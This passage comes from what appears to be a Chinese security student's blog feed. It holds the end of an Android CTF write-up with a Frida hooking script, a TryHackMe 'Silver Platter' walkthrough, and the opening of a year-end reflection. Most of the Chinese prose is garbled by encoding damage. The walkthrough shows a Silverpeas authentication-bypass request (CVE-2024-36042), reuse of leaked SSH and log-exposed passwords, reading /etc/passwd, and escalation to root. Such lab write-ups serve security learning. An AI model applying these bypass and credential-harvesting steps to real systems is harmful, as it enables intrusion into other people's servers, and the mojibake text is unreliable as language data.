language_">this</span>.<span class="hljs-property">stream</span> = args[<span class="hljs-number">3</span>];   <span class="hljs-comment">// ä¿å­˜ FILE* å‚æ•°</span><br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>            <span class="hljs-comment">// è¿™é‡Œå¯ä»¥ä¿®æ”¹ buffer çš„å†…å®¹ï¼Œå‡è®¾æˆ‘ä»¬çŸ¥é“ä½•æ—¶ fread è¢«ç”¨äºæ•æ„Ÿæ“ä½œ</span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>() == <span class="hljs-number">8</span>) &#123;<br>                <span class="hljs-comment">// æ¨¡æ‹Ÿ fread è¯»å–äº†é¢„æœŸæ•°æ®ï¼Œä¼ªé€ è¿”å›å€¼</span><br>                <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>, [<span class="hljs-number">0xe9</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xf0</span>]); <br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">// å¡«å……å‰8å­—èŠ‚</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>));<br>            &#125;<br>        &#125;<br>    &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error: memcmp function not found in libc.so&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">hook_memcmp_addr</span>();<br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input =<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>+<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br><br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span>=<span class="hljs-title class_">MainActivity</span>.$new();<br>    <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br><br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br><br></code></pre></td></tr></table></figure><p>å¾—å‡º flag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;a8490cd255d3a0a982fac16130183b76&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Androidé¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Silver Platter</title>
    <link href="/2025/01/31/Platter/"/>
    <url>/2025/01/31/Platter/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap æ‰«ä¸€ä¸‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">159</span>.<span class="hljs-number">147</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c60ad30e212b87c6.png"></p><p>å¼€æ”¾äº† <code>22ï¼Œ80ï¼Œ8080</code> ç«¯å£ï¼Œé‡ç‚¹çœ‹çœ‹ <code>80</code>ã€<code>8080</code> ç«¯å£</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>ç‚¹å‡»ä¸åŒçš„é¡µé¢æ—¶ä¼šåœ¨ â€œcontactâ€ é¡µé¢ä¸­çœ‹åˆ°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/0323fb05558d585c.png"></p><p>æœ‰ä¸€ä¸ªå« <strong><code>scr1ptkiddy</code></strong> çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªå« <strong><code>Silverpeas</code></strong> çš„ä¸œè¥¿ã€‚</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>è®¿é—®è¿›å»å‘ç°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">404 - Not Found<br></code></pre></td></tr></table></figure><p>æ‰«æäº†ä¸€ä¸‹ç›®å½•</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//10.10.159.147:8080/</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå°è¯•ä¸€ç•ªååœ¨ <code>8080</code> ç«¯å£å‘ç°æœ‰ä¸€ä¸ª <code>silverpeas</code> é¡µé¢ï¼Œæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢</p><h1 id="CVE-åˆ©ç”¨"><a href="#CVE-åˆ©ç”¨" class="headerlink" title="CVE åˆ©ç”¨"></a>CVE åˆ©ç”¨</h1><p>æœ€å¼€å§‹å°è¯•äº†çˆ†ç ´ï¼Œåæ¥å‘ç°ä¸ç°å®ï¼Œäºæ˜¯å»æœäº†çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´ï¼Œåœ¨ GitHub ä¸Šå‘ç°äº†å…³äº Silverpeas çš„ CVEï¼šCVE-2024-36042ï¼Œä¸€ä¸ªèº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼Œ<a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d%E3%80%82">https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2dã€‚</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">Login</span>=scr1ptkiddy&amp;Password=111&amp;DomainId=0<br>-&gt; <span class="hljs-attribute">Login</span>=scr1ptkiddy&amp;DomainId=0<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f52af2a087f0fa6e.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/04502533f67ea345.png"></p><p>ç™»å½•æˆåŠŸï¼</p><h1 id="è·å–-shell"><a href="#è·å–-shell" class="headerlink" title="è·å– shell"></a>è·å– shell</h1><p>è¿›å»ä¹‹åæ‰¾äº†ä¸€åœˆä¹Ÿæ²¡å‘ç°å•¥ä¸€æ ·çš„ä¸œè¥¿ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°æœ‰ 3 ä¸ªç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/ca968e98819c6e7a.png"></p><p>æŒ¨ä¸ªç”¨èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´å»å°è¯•å…¶ä½™ä¸¤ä¸ªç”¨æˆ·ï¼Œæœ€åæˆåŠŸç™»ä¸Šäº† <code>Manager</code> è´¦æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf1681240b4dfe6d.png"></p><p>å‘ç°äº† ssh ç™»é™†å‡­è¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">Username: tim<br><br>Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/49e8ce2eacc5f759.png"></p><p>é€šè¿‡ ssh æˆåŠŸç™»å½•è·å–åˆ° user flag</p><h1 id="ç®€å•ææƒ"><a href="#ç®€å•ææƒ" class="headerlink" title="ç®€å•ææƒ"></a>ç®€å•ææƒ</h1><p>æŸ¥çœ‹ <code>/etc/passwd</code> ç›®å½•ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ª <code>tyler</code> ç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">tim@silver-platter:/home$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br>tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false<br>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>tyler:x:1000:1000:root:/home/tyler:/bin/bash<br>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br>tim:x:1001:1001::/home/tim:/bin/bash<br>dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler:x:1000:1000:root:/home/tyler:/bin/bash<br></code></pre></td></tr></table></figure><p>æ²¡åŠæ³•ææƒï¼Œæ¥çœ‹çœ‹æ—¥å¿—ï¼Œç»ˆäºåœ¨æˆ‘ä¸€æ¡ä¸€æ¡çœ‹çœ‹äº†å¾ˆä¹…ä¹‹åæ‰¾åˆ°äº†æœ‰ç”¨çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dec 13 15:40:33 silver-platter <span class="hljs-built_in">sudo</span>:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°äº†<code>password:_Zd_zx7N823/</code></p><p>ç›´æ¥ç”¨ su ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tim@silver-platter:/var/log$ su tyler<br>Password:<br>tyler@silver-platter:/var/log$ <span class="hljs-built_in">id</span><br>uid=1000(tyler) gid=1000(tyler) <span class="hljs-built_in">groups</span>=1000(tyler),4(adm),24(cdrom),27(<span class="hljs-built_in">sudo</span>),30(dip),46(plugdev),110(lxd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler@silver-platter:~$ <span class="hljs-built_in">sudo</span> -l<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> tyler:<br>Matching Defaults entries <span class="hljs-keyword">for</span> tyler on silver-platter:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User tyler may run the following commands on silver-platter:<br>    (ALL : ALL) ALL<br>tyler@silver-platter:~$ <span class="hljs-built_in">cd</span> /home<br>tyler@silver-platter:/home$ <span class="hljs-built_in">ls</span><br>tim  tyler<br>tyler@silver-platter:/home$ <span class="hljs-built_in">cd</span> tyler<br>tyler@silver-platter:~$ <span class="hljs-built_in">cd</span> /root<br>bash: <span class="hljs-built_in">cd</span>: /root: Permission denied<br></code></pre></td></tr></table></figure><p>è¾“å‡ºäº† <code>Permission denied</code>ï¼Œæƒé™è¿˜æ˜¯ä¸å¤Ÿï¼Œå‘ç° <code>User tyler may run the following commands on silver-platter:     (ALL : ALL) ALL</code>ï¼Œæ‰€ä»¥ç›´æ¥è¯•è¯• <code>sudo su</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler@silver-platter:~$ <span class="hljs-built_in">sudo</span> su<br>root@silver-platter:/home/tyler# <span class="hljs-built_in">cd</span> /root<br>root@silver-platter:~# <span class="hljs-built_in">ls</span><br>root.txt  snap  start_docker_containers.sh<br>root@silver-platter:~# <span class="hljs-built_in">cat</span> root.txt<br>THM&#123;098f6bcd4621d373cade4e832627b4f6&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f3a65c8f8cf6b607.png"></p><p>æ‹¿åˆ° root flag</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 å¹´æ€»ç»“</title>
    <link href="/2025/01/28/2024%E6%80%BB%E7%BB%93/"/>
    <url>/2025/01/28/2024%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>è™½ç„¶æ²¡æœ‰ä»€ä¹ˆæˆç»©ï¼Œä½†ä¹Ÿç®—æ˜¯æˆé•¿äº†ä¸€å¹´ï¼Œæ–°å¹´å¿«ä¹ï¼</p><span id="more"></span><p>â€‹        å¿½ç„¶ä¹‹é—´ï¼Œæ›¾ä»¥ä¸ºé¥è¿œçš„2025ä¹Ÿè¦åˆ°æ¥äº†ï¼Œä»¥å‰ä»æ¥æ²¡æœ‰å†™è¿‡å¹´åº¦æ€»ç»“ï¼Œå› ä¸ºä¸€ç›´è§‰å¾—è‡ªå·±ä¸æ˜¯ä¸€ä¸ªæˆåŠŸçš„äººï¼Œçœ‹ç€é‚£äº›ä¼˜ç§€çš„å¸ˆå‚…ä»¬æ´‹æ´‹æ´’æ´’åœ°å†™ä¸‹ä»–ä»¬çš„è¾‰ç…Œçš„æˆ˜ç»©ï¼Œå‘ç°è‡ªå·±å¾ˆéš¾å®šä¹‰è¿™ä¸€å¹´çœŸæ­£æ‹¥æœ‰è¿‡ä»€ä¹ˆï¼Œæ”¶è·äº†ä»€ä¹ˆï¼Œå°±è§‰å¾—æ˜æ˜æ²‰æ²‰çš„ä¸€å¹´å°±åˆè¦è¿‡å»äº†ã€‚ä½†æ˜¯ N1nEmAnâ€…å¸ˆå‚…è¯´ï¼šå†™å¹´ç»ˆæ€»ç»“æƒ³å†™å°±å†™å§ï¼Œå“ªæœ‰é‚£ä¹ˆå¤šæˆåŠŸã€‚äºæ˜¯æˆ‘ååœ¨æˆ¿é—´é‡Œå†™ä¸‹è¿™æ®µè¯ã€‚</p><p>â€‹å¤§ä¸€ä¸Šçš„æ—¶å€™ä¹Ÿå­¦è¿‡ä¸€äº›å‰ç«¯ã€ç®—æ³•ï¼Œä½†æ˜¯å­¦ç€å­¦ç€å‘ç°æˆ‘ä¸å–œæ¬¢ï¼Œæˆ‘çš„ç¡®å¯¹å®ƒä»¬äº§ç”Ÿä¸äº†å…´è¶£ï¼Œé”è¯„ä¸€ä¸‹ï¼šæ¯ç‡¥ï¼‹æ²¡æ„æ€ã€‚å½“æ—¶å¯’å‡ä¹Ÿæƒ³ç€åšä¸ªåŠ¨æ€ç½‘ç«™å‡ºæ¥ï¼Œå¯æ˜¯æœ€ç»ˆè¿˜æ˜¯æ²¡æœ‰äº§å‡ºï¼Œé‚æ”¾å¼ƒã€‚å¤§ä¸€ä¸‹å¼€å­¦äº†ï¼Œå¾ˆè½»æ¾ï¼Œçªç„¶åœ¨äº”æœˆçš„æŸä¸€å¤©å¼€å§‹æ€è€ƒè‡ªå·±åˆ°åº•è¦å­¦ä»€ä¹ˆï¼Œå…¶å®éå¸¸æ„Ÿè°¢å­¦é•¿å­¦å§ä»¬ç»™äº†æˆ‘å¾ˆå¤šç‚¹æ‹¨ï¼Œè®©æˆ‘çŸ¥é“äº†æ›´å¤šä¿¡æ¯ã€‚</p><p>â€‹å…­æœˆå¼€å§‹å¬ç€å­¦é•¿çš„å»ºè®®å¼€å§‹çœ‹ç½‘ç»œåŸºç¡€ï¼ˆä½†æ˜¯æ„Ÿè§‰è‡ªå·±æœ‰ä¸€ç§ä¸‰å¤©æ‰“é±¼ä¸¤å¤©æ™’ç½‘çš„æƒ…å†µqwqï¼‰ï¼Œçœ‹äº†æ²¡å¤šä¹…å°±å› ä¸ºæœŸæœ«å‘¨æç½®äº†ã€‚æš‘å‡å¼€å§‹ï¼Œå› ä¸ºç®—æ³•åŸ¹è®­ç•™æ ¡äº†ä¸¤å‘¨ï¼ˆå…¶å®å°±æ˜¯ä¸ºäº†ç•™æ ¡ï¼Œæˆ‘å¹¶ä¸æƒ³ä¸Šç®—æ³•è¯¾wwwï¼‰ï¼Œå½“æ—¶æƒ³å­¦é€†å‘ï¼ŒæŒ‰ç…§å­¦å§çš„å»ºè®®å­¦ä¹ äº†æ±‡ç¼–ï¼Œå—¯â€¦æ„Ÿè§‰ä¹Ÿå­¦çš„ä¸ç²¾ã€‚ç•™æ ¡æœŸé—´æœ‰å¹¸ç»è¿‡å­¦é•¿æ¨èæ‰“äº†å½“æ—¶å¤§äºŒæ‹”å°–ç­çš„å†…éƒ¨èµ›ï¼ˆè¿™ç®—æ˜¯æˆ‘æ‰“çš„ç¬¬ä¸€åœº CTFæ¯”èµ›wowï¼‰ï¼ŒCTFä¹Ÿæ˜¯æŸ“ä¸Šäº†hhhhhhã€‚</p><p>â€‹å›å®¶ä¹‹åç»§ç»­çœ‹åŸºç¡€ï¼Œéšä¹‹è€Œæ¥çš„æœ‰å¾ˆå¤šæ–°ç”Ÿèµ›ï¼ŒBaseCTFã€MoeCTF ç­‰ç­‰ï¼ˆæ€ä¹ˆä¼šæœ‰è¿™ä¹ˆå¤šæ–°ç”Ÿèµ›ï¼ï¼ï¼ï¼‰ï¼Œä¸€è¾¹å­¦ä¸€è¾¹æ‰“ï¼Œå¤ªèœäº†ï¼Œä¸€ä¸ªæš‘å‡è¿‡å»æ‰åªèƒ½åšç®€å•é¢˜qwqï¼Œä½†æ˜¯è®¤è¯†äº†å¥½å¤šå‰å®³çš„å¸ˆå‚…ï¼</p><p>â€‹å¼€å­¦ä¹‹åä¹Ÿåœ¨å­¦ï¼Œè¦å­¦çš„å¤ªå¤šäº†ï¼Œçªç„¶æ­¥å…¥äº†è¿·èŒ«é˜¶æ®µï¼Œæ„Ÿè§‰å¤§å­¦å¥½çŸ­ï¼Œæƒ³å­¦çš„å¾ˆå¤šï¼Œä½†æ˜¯æˆ‘å¥½åƒå°±æ˜¯å¾ˆç¬¨ï¼Œå°±æ˜¯å­¦ä¸ä¼šï¼Œåˆ«äººä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥åŸç†ç”šè‡³è„±å£è€Œå‡ºç­”æ¡ˆçš„ä¸œè¥¿è€Œæˆ‘çœ‹ç­”æ¡ˆéƒ½çœ‹ä¸æ‡‚ã€‚å¤§å®¶éƒ½å¥½å‰å®³ï¼Œæˆ‘å¾ˆç¾¡æ…•è®¤è¯†çš„è¿™äº›å¸ˆå‚…ä»¬å¯ä»¥æ‰“æ¯”èµ›ï¼Œå¯ä»¥æ‹¿å¥–ï¼Œè‡ªå·±å±äºæ˜¯å·åˆå·ä¸èµ¢ï¼Œèººåˆèººä¸å¹³ã€‚æ¯å¤©éƒ½åœ¨ç ´é˜²å½“ä¸­ï¼Œæ˜¯åšé¢˜æ—¶ä»£ç åˆ†æä¸å‡ºæ¥çš„ç ´é˜²ï¼Œæ˜¯é—®åˆ«çš„å¸ˆå‚…é¢˜æ—¶å¬ä¸æ‡‚çš„ç ´é˜²ï¼Œæ˜¯çœ‹é¢˜è§£æ—¶çœ‹ä¸æ˜ç™½çš„ç ´é˜²ï¼Œæ˜¯å¤ç°ä¸å‡ºæ¥çš„ç ´é˜²ï¼Œæ¯å¤©ä¸æ˜¯åœ¨ç ´é˜²å°±æ˜¯åœ¨ç ´é˜²çš„è·¯ä¸Šï¼Œæˆ‘å¸¸å¸¸æƒ³ï¼Œè¦æ˜¯æˆ‘èƒ½æ›´èªæ˜ä¸€ç‚¹ã€æ›´å‰å®³ä¸€ç‚¹å°±å¥½äº†ã€‚æœ‰æ—¶å€™åœ¨å›å®¿èˆçš„æ¥¼æ¢¯é—´ç¢°è§è®¤è¯†çš„äººä¼šè¢«æ„Ÿæ…¨ä¸€å¥å­¦è¿™ä¹ˆæ™šæ‰å›æ¥å•Šã€‚å…¶å®æˆ‘ä¹Ÿä¸æƒ³å­¦è¿™ä¹ˆä¹…ï¼Œæ¯æ¬¡å›å¯å®¤çš„è·¯ä¸Šä¸€ä¸ªäººéƒ½æ²¡æœ‰ï¼Œæˆ‘ä¹Ÿæƒ³çœ‹ä¸€çœ¼å°±æ‡‚ï¼Œä¸èŠ±è´¹è¿™ä¹ˆå¤šæ—¶é—´ã€‚ç™½å¤©å‡ ä¹æ»¡è¯¾ï¼ŒçœŸæ­£èƒ½é™ä¸‹å¿ƒæ¥å­¦ä¹ çš„æ—¶å€™å¾ˆå°‘ï¼Œæƒ³å¤šçœ‹ä¸€ç‚¹ï¼Œæœ‰æ—¶å€™ç”šè‡³éƒ½ä¸æƒ³å›å¯å®¤ç¡è§‰äº†ã€‚å¥½åœ¨å¤œæ™šèƒ½å¹ç€å‡‰çˆ½çš„é£ï¼Œä¹Ÿç®—æ˜¯å¹³æ·¡ç”Ÿæ´»é‡Œçš„æ…°è—‰ã€‚</p><p>â€‹ä¹æœˆåº•é€šè¿‡ä¸€ä¸ªåœ¨é˜¿é‡Œå·¥ä½œçš„å­¦é•¿äº†è§£åˆ°é€†å‘ç¡®å®ä¸å¥½æ‰¾å·¥ä½œï¼ˆå­¦å¾—å‰å®³æ‰è¡Œï¼‰ï¼Œåœ¨ç»è¿‡å¾ˆä¹…çš„æ€æƒ³æ–—äº‰ä¹‹åå†³å®šè½¬å‘ webï¼Œåæœˆå¼€å§‹å­¦ä¹  webï¼Œå¹¸è¿çš„æ˜¯æœ‰å­¦é•¿å¸¦ç€æˆ‘ï¼Œå­¦äº†ä¸€äº›åŸºç¡€æ¼æ´å’ŒæŒ–æ¼æ´æŠ€å·§ï¼ŒCTF çš„ web æ–¹å‘çš„é¢˜æ…¢æ…¢èƒ½åšä¸€äº›äº†ï¼Œç„¶åå¯¹æ­¤äº§ç”Ÿäº†å…´è¶£ï¼ä½†æ˜¯è¿˜æ˜¯æ„Ÿè§‰è‡ªå·±åƒåŠåŠå­å‘œå‘œå‘œå‘œå‘œã€‚</p><p>â€‹åä¸€æœˆå¼€å§‹å°±æ…¢æ…¢ç»“è¯¾ï¼Œå¼€å§‹å¤ä¹ è€ƒè¯•ï¼Œå­¦ä¹ çš„æ—¶é—´å°±å˜å¾—æ›´å°‘äº†ï¼Œå€¼å¾—å¼€å¿ƒçš„æ˜¯æˆ‘æ­å¥½äº†è‡ªå·±çš„åšå®¢è·Ÿå¾ˆå¤šå‰å®³çš„å¸ˆå‚…ä»¬åŠ äº†å‹é“¾ï¼Œå¹¶ä¸”ç«‹ä¸‹ flag ä¸‰å¤©æ›´ä¸€ç¯‡ï¼ˆå…¶å®å¹¶æ²¡æœ‰ cat åˆ°å‘œå‘œå‘œå‘œå‘œï¼‰ã€‚</p><p>â€‹åäºŒæœˆï¼Œè¿™ä¸ªæœˆæ›´æ˜¯é‡é‡çº§ï¼Œå‡ ä¹æ¯å‘¨éƒ½æœ‰è€ƒè¯•ï¼Œè¿™ä¸ªæœˆæ˜¯ä¸€ç‚¹æ²¡å­¦ï¼Œä½†æ˜¯æ‰“äº†å›½èµ›ï¼ˆå·®ç‚¹è¿›çº¿ä¸‹ï¼Œå”‰é—æ†¾ï¼Œä½†è¿˜æ˜¯æ„Ÿè°¢å­¦é•¿ä»¬å¸¦æˆ‘æ‰“è¿™ä¹ˆå¤§çš„æ¯”èµ›ï¼‰ï¼Œæœ‰å¹¸è¢«é‚€è¯·æˆä¸ºäº† RDCTF çš„å‡ºé¢˜äººï¼Œå¤ªèœäº†åªèƒ½å‡ºç­¾åˆ°é¢˜å’Œç®€å•é¢˜qwqã€‚</p><p>â€‹æœˆåº•è€ƒå®Œ Java ååˆšå¥½æœ‰å‡ 